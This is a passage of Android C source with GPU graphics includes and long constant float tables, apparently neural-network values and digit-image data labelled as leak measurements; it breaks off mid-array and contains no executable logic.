#include <android/log.h>
#include <jni.h>

#include <EGL/egl.h>
#include <EGL/eglext.h>
#include <GLES3/gl3.h>
#include <GLES3/gl32.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

#define DEBUG   0

//unsigned int nn_r1_y_leak_values[] = {0x3bd6441e, 0x3c8a1fab, 0x3cdeae4a, 0x3d199e77, 0x3d43e5c8, 0x3d6e2d20, 0x3d8c3a36, 0x3da15dde, 0x3db68187, 0x3dcba530, 0x3de0c8dc, 0x3df5ec7e, 0x3e058816, 0x3e1019e9, 0x3e1aabc0, 0x3e253d93, 0x3e2fcf66, 0x3e3a6138, 0x3e44f30a, 0x3e4f84e4, 0x3e5a16b9, 0x3e64a88d, 0x3e6f3a5f, 0x3e79cc39, 0x3e822f01, 0x3e8777ef, 0x3e8cc0d8, 0x3e9209c4, 0x3e9752ae, 0x3e9c9b98, 0x3ea1e482, 0x3ea72d6d, 0x3eac7656, 0x3eb1bf3a, 0x3eb7082e, 0x3ebc5111, 0x3ec199fc, 0x3ec6e2e8, 0x3ecc2bd3, 0x3ed174bb, 0x3ed6bda8, 0x3edc0690, 0x3ee14f79, 0x3ee69865, 0x3eebe14f, 0x3ef12a36, 0x3ef67327, 0x3efbbc0a, 0x3f00827c, 0x3f0326f0, 0x3f05cb65, 0x3f086fdc, 0x3f0b144c, 0x3f0db8c4, 0x3f105d3b, 0x3f1301b1, 0x3f15a624, 0x3f184a99, 0x3f1aef0f, 0x3f1d9388, 0x3f2037fa, 0x3f22dc6d, 0x3f2580e7, 0x3f282559, 0x3f2ac9ca, 0x3f2d6e46, 0x3f3012b8, 0x3f32b731, 0x3f355ba5, 0x3f380015, 0x3f3aa48a, 0x3f3d48fd, 0x3f3fed77, 0x3f4291e8, 0x3f45365e, 0x3f47dad8, 0x3f4a7f49, 0x3f4d23c7, 0x3f4fc832, 0x3f526cac, 0x3f551122, 0x3f57b594, 0x3f5a5a0a, 0x3f5cfe7d, 0x3f5fa2f5, 0x3f624767, 0x3f64ebdd, 0x3f67904d, 0x3f6a34c9, 0x3f6cd940, 0x3f6f7db6, 0x3f722224, 0x3f74c69c, 0x3f776b0e, 0x3f7a0f83, 0x3f7cb3f9, 0x3f7f586e, 0x3f80fe73, 0x3f8250ad, 0x3f83a2ea, 0x3f84f520, 0x3f86475e, 0x3f879995, 0x3f88ebd0, 0x3f8a3e0a, 0x3f8b9046, 0x3f8ce281, 0x3f8e34bd, 0x3f8f86f6, 0x3f90d931, 0x3f922b6b, 0x3f937da5, 0x3f94cfdd, 0x3f96221a, 0x3f977453, 0x3f98c68f, 0x3f9a18c9, 0x3f9b6b04, 0x3f9cbd41, 0x3f9e0f78, 0x3f9f61b4, 0x3fa0b3f1, 0x3fa2062c, 0x3fa35863, 0x3fa4aa9f, 0x3fa5fcd9, 0x3fa74f16, 0x3fa8a14e, 0x3fa9f38a, 0x3fab45c5, 0x3fac97ff, 0x3fadea36, 0x3faf3c72, 0x3fb08eaf, 0x3fb1e0ef, 0x3fb33323, 0x3fb4855b, 0x3fb5d797, 0x3fb729d0, 0x3fb87c0c, 0x3fb9ce49, 0x3fbb207f, 0x3fbc72bc, 0x3fbdc4f7, 0x3fbf1733, 0x3fc0696c, 0x3fc1bba7, 0x3fc30de0, 0x3fc4601e, 0x3fc5b254, 0x3fc70490, 0x3fc856d0, 0x3fc9a905, 0x3fcafb41, 0x3fcc4d76, 0x3fcd9fb3, 0x3fcef1ef, 0x3fd04429, 0x3fd19666, 0x3fd2e89f, 0x3fd43ad9, 0x3fd58d17, 0x3fd6df53, 0x3fd83187, 0x3fd983c4, 0x3fdad601, 0x3fdc283d, 0x3fdd7a70, 0x3fdeccaf, 0x3fe01ee6, 0x3fe17123, 0x3fe2c35f, 0x3fe41594, 0x3fe567d6, 0x3fe6ba0c, 0x3fe80c49, 0x3fe95e7f, 0x3feab0bc, 0x3fec02f7, 0x3fed5537, 0x3feea769, 0x3feff9a3, 0x3ff14be2, 0x3ff29e1e, 0x3ff3f059, 0x3ff54290, 0x3ff694c9, 0x3ff7e707, 0x3ff93942, 0x3ffa8b7a, 0x3ffbddb4, 0x3ffd2ff1, 0x3ffe822c, 0x3fffd466, 0x40009350, 0x40013c72, 0x4001e58b, 0x40028ea7, 0x400337c5, 0x4003e0e0, 0x40048a00, 0x4005331b, 0x4005dc38, 0x40068557, 0x40072e74, 0x4007d791, 0x400880b0, 0x400929cc, 0x4009d2e8, 0x400a7c06, 0x400b2523, 0x400bce3f, 0x400c7762, 0x400d207b, 0x400dc995, 0x400e72b8, 0x400f1bd2, 0x400fc4f0, 0x40106e0c, 0x4011172b, 0x4011c049, 0x40126964, 0x40131282, 0x4013bba1, 0x401464be, 0x40150ddb, 0x4015b6f9, 0x40166019, 0x4017092e, 0x4017b24f, 0x40185b6e, 0x4019048c, 0x4019ada9, 0x401a56c7, 0x401affe3, 0x401ba8fd, 0x401c521f, 0x401cfb3b, 0x401da458, 0x401e4d77, 0x401ef692, 0x401f9fb0, 0x402048c9, 0x4020f1eb, 0x40219b06, 0x40224425, 0x4022ed40, 0x4023965d, 0x40243f7a, 0x4024e89a, 0x402591b9, 0x40263ad5, 0x4026e3f1, 0x40278d0e, 0x4028362c, 0x4028df4e};
unsigned int nn_r1_y_leak_values[] = {0x3a22877f, 0x3aa52695, 0x3af9096b, 0x3b267621, 0x3b50678c, 0x3b7a58f7, 0x3b922531, 0x3ba71de6, 0x3bbc169c, 0x3bd10f51, 0x3be60807, 0x3bfb00bc, 0x3c07fcb9, 0x3c127914, 0x3c1cf56e, 0x3c2771c9, 0x3c31ee24, 0x3c3c6a7f, 0x3c46e6d9, 0x3c516334, 0x3c5bdf8f, 0x3c665bea, 0x3c70d844, 0x3c7b549f, 0x3c82e87d, 0x3c8826aa, 0x3c8d64d8, 0x3c92a305, 0x3c97e132, 0x3c9d1f60, 0x3ca25d8d, 0x3ca79bbb, 0x3cacd9e8, 0x3cb21815, 0x3cb75643, 0x3cbc9470, 0x3cc1d29d, 0x3cc710cb, 0x3ccc4ef8, 0x3cd18d26, 0x3cd6cb53, 0x3cdc0980, 0x3ce147ae, 0x3ce685db, 0x3cebc408, 0x3cf10236, 0x3cf64063, 0x3cfb7e91, 0x3d005e5f, 0x3d02fd76, 0x3d059c8c, 0x3d083ba3, 0x3d0adaba, 0x3d0d79d0, 0x3d1018e7, 0x3d12b7fe, 0x3d155714, 0x3d17f62b, 0x3d1a9542, 0x3d1d3459, 0x3d1fd36f, 0x3d227286, 0x3d25119d, 0x3d27b0b3};

unsigned int cnn_r2x_output[] = { 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3ea8a8a9, 0x3f39b9ba, 0x3f1f9fa0, 0x3f179798, 0x3e70f0f1, 0x3e109091, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f5ededf, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f71f1f2, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f2aaaab, 0x3e50d0d1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e868687, 0x3ee4e4e5, 0x3e909091, 0x3ee4e4e5, 0x3f23a3a4, 0x3f63e3e4, 0x3f7efeff, 0x3f61e1e2, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f7afafb, 0x3f65e5e6, 0x3f7efeff, 0x3f7efeff, 0x3f0c8c8d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d888889, 0x3e848485, 0x3d60e0e1, 0x3e868687, 0x3e868687, 0x3e868687, 0x3e6ceced, 0x3da8a8a9, 0x3f6ceced, 0x3f7efeff, 0x3ed4d4d5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3ea6a6a7, 0x3f7dfdfe, 0x3f51d1d2, 0x3d909091, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3db0b0b1, 0x3f69e9ea, 0x3f800000, 0x3ea6a6a7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f018182, 0x3f7efeff, 0x3f6eeeef, 0x3e30b0b1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e6ceced, 0x3f79f9fa, 0x3f7efeff, 0x3e78f8f9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f058586, 0x3f7efeff, 0x3f3bbbbc, 0x3ca0a0a1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d109091, 0x3f4dcdce, 0x3f78f8f9, 0x3e68e8e9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3efcfcfd, 0x3f7efeff, 0x3f36b6b7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e969697, 0x3f7bfbfc, 0x3f70f0f1, 0x3e64e4e5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d989899, 0x3f5dddde, 0x3f7efeff, 0x3f26a6a7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3c40c0c1, 0x3f4bcbcc, 0x3f7efeff, 0x3f5bdbdc, 0x3e0c8c8d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e189899, 0x3f7efeff, 0x3f7efeff, 0x3e9a9a9b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3df8f8f9, 0x3f60e0e1, 0x3f7efeff, 0x3ee6e6e7, 0x3b808081, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f058586, 0x3f7efeff, 0x3f7efeff, 0x3e50d0d1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3ea8a8a9, 0x3f39b9ba, 0x3f1f9fa0, 0x3f179798, 0x3e70f0f1, 0x3e109091, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f5ededf, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f71f1f2, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f2aaaab, 0x3e50d0d1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e868687, 0x3ee4e4e5, 0x3e909091, 0x3ee4e4e5, 0x3f23a3a4, 0x3f63e3e4, 0x3f7efeff, 0x3f61e1e2, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f7afafb, 0x3f65e5e6, 0x3f7efeff, 0x3f7efeff, 0x3f0c8c8d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d888889, 0x3e848485, 0x3d60e0e1, 0x3e868687, 0x3e868687, 0x3e868687, 0x3e6ceced, 0x3da8a8a9, 0x3f6ceced, 0x3f7efeff, 0x3ed4d4d5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3ea6a6a7, 0x3f7dfdfe, 0x3f51d1d2, 0x3d909091, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3db0b0b1, 0x3f69e9ea, 0x3f800000, 0x3ea6a6a7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f018182, 0x3f7efeff, 0x3f6eeeef, 0x3e30b0b1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e6ceced, 0x3f79f9fa, 0x3f7efeff, 0x3e78f8f9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f058586, 0x3f7efeff, 0x3f3bbbbc, 0x3ca0a0a1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d109091, 0x3f4dcdce, 0x3f78f8f9, 0x3e68e8e9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3efcfcfd, 0x3f7efeff, 0x3f36b6b7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e969697, 0x3f7bfbfc, 0x3f70f0f1, 0x3e64e4e5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d989899, 0x3f5dddde, 0x3f7efeff, 0x3f26a6a7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3c40c0c1, 0x3f4bcbcc, 0x3f7efeff, 0x3f5bdbdc, 0x3e0c8c8d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e189899, 0x3f7efeff, 0x3f7efeff, 0x3e9a9a9b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3df8f8f9, 0x3f60e0e1, 0x3f7efeff, 0x3ee6e6e7, 0x3b808081, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f058586, 0x3f7efeff, 0x3f7efeff, 0x3e50d0d1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3ea8a8a9, 0x3f39b9ba, 0x3f1f9fa0, 0x3f179798, 0x3e70f0f1, 0x3e109091, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f5ededf, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f71f1f2, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f2aaaab, 0x3e50d0d1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e868687, 0x3ee4e4e5, 0x3e909091, 0x3ee4e4e5, 0x3f23a3a4, 0x3f63e3e4, 0x3f7efeff, 0x3f61e1e2, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f7afafb, 0x3f65e5e6, 0x3f7efeff, 0x3f7efeff, 0x3f0c8c8d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d888889, 0x3e848485, 0x3d60e0e1, 0x3e868687, 0x3e868687, 0x3e868687, 0x3e6ceced, 0x3da8a8a9, 0x3f6ceced, 0x3f7efeff, 0x3ed4d4d5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3ea6a6a7, 0x3f7dfdfe, 0x3f51d1d2, 0x3d909091, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3db0b0b1, 0x3f69e9ea, 0x3f800000, 0x3ea6a6a7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f018182, 0x3f7efeff, 0x3f6eeeef, 0x3e30b0b1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e6ceced, 0x3f79f9fa, 0x3f7efeff, 0x3e78f8f9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f058586, 0x3f7efeff, 0x3f3bbbbc, 0x3ca0a0a1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d109091, 0x3f4dcdce, 0x3f78f8f9, 0x3e68e8e9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3efcfcfd, 0x3f7efeff, 0x3f36b6b7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e969697, 0x3f7bfbfc, 0x3f70f0f1, 0x3e64e4e5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d989899, 0x3f5dddde, 0x3f7efeff, 0x3f26a6a7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3c40c0c1, 0x3f4bcbcc, 0x3f7efeff, 0x3f5bdbdc, 0x3e0c8c8d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e189899, 0x3f7efeff, 0x3f7efeff, 0x3e9a9a9b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3df8f8f9, 0x3f60e0e1, 0x3f7efeff, 0x3ee6e6e7, 0x3b808081, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f058586, 0x3f7efeff, 0x3f7efeff, 0x3e50d0d1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3ea8a8a9, 0x3f39b9ba, 0x3f1f9fa0, 0x3f179798, 0x3e70f0f1, 0x3e109091, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f5ededf, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f71f1f2, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f2aaaab, 0x3e50d0d1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e868687, 0x3ee4e4e5, 0x3e909091, 0x3ee4e4e5, 0x3f23a3a4, 0x3f63e3e4, 0x3f7efeff, 0x3f61e1e2, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f7afafb, 0x3f65e5e6, 0x3f7efeff, 0x3f7efeff, 0x3f0c8c8d, 0x0, 0x0, 0x0, 0x0, 0x0, 